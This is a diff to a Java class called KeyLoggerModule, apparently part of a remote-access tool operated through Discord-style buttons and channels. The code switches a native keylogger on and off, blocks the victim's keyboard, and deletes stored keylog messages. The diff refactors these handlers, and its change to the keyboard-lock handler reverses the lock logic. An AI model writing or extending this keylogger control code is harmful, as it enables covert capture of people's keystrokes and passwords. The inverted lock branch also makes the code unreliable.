@@ -67,13 +67,13 @@ public class KeyLoggerModule extends Module {
 			return;
 		}
 
-		if(enable) {
-			NativeLibrary.Enable = enable;
-			context.deferEdit().queue();
+		if(!enable) {
+			Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> NativeLibrary.Enable = false);
 			return;
 		}
 
-		Question.positive(context.reply(), "Are you sure you want to disable KeyLogger?", QuestionType.YES_NO, () -> NativeLibrary.Enable = false);
+		NativeLibrary.Enable = enable;
+		context.deferEdit().queue();
 	}
 
 	private void buttonLock(ButtonContext context, boolean lock) {
@@ -83,12 +83,12 @@ public class KeyLoggerModule extends Module {
 		}
 
 		if(lock) {
-			NativeLibrary.Block = lock;
-			context.deferEdit().queue();
+			Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> NativeLibrary.Block = false);
 			return;
 		}
 
-		Question.positive(context.reply(), "Are you sure you want to unlock the keyboard?", QuestionType.YES_NO, () -> NativeLibrary.Block = false);
+		NativeLibrary.Block = lock;
+		context.deferEdit().queue();
 	}
 
 	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
@@ -104,18 +104,16 @@ public class KeyLoggerModule extends Module {
 	private void buttonClear(ButtonContext context) {
 		long identifier = context.getMessageIdLong();
 		MessageChannel channel = context.getChannel();
-		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", QuestionType.YES_NO, () -> {
-			MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
-				List<Message> list = history.getRetrievedHistory();
+		Question.positive(context.reply(), "Are you sure you want to clear the KeyLog information?", QuestionType.YES_NO, () -> MessageHistory.getHistoryFromBeginning(channel).queue(history -> {
+			List<Message> list = history.getRetrievedHistory();
 
-				for(int i = 0; i < list.size(); i++) {
-					Message message = list.get(i);
+			for(int i = 0; i < list.size(); i++) {
+				Message message = list.get(i);
 
-					if(message.getIdLong() != identifier) {
-						message.delete().queue();
-					}
+				if(message.getIdLong() != identifier) {
+					message.delete().queue();
 				}
-			});
-		});
+			}
+		}));
 	}
 }
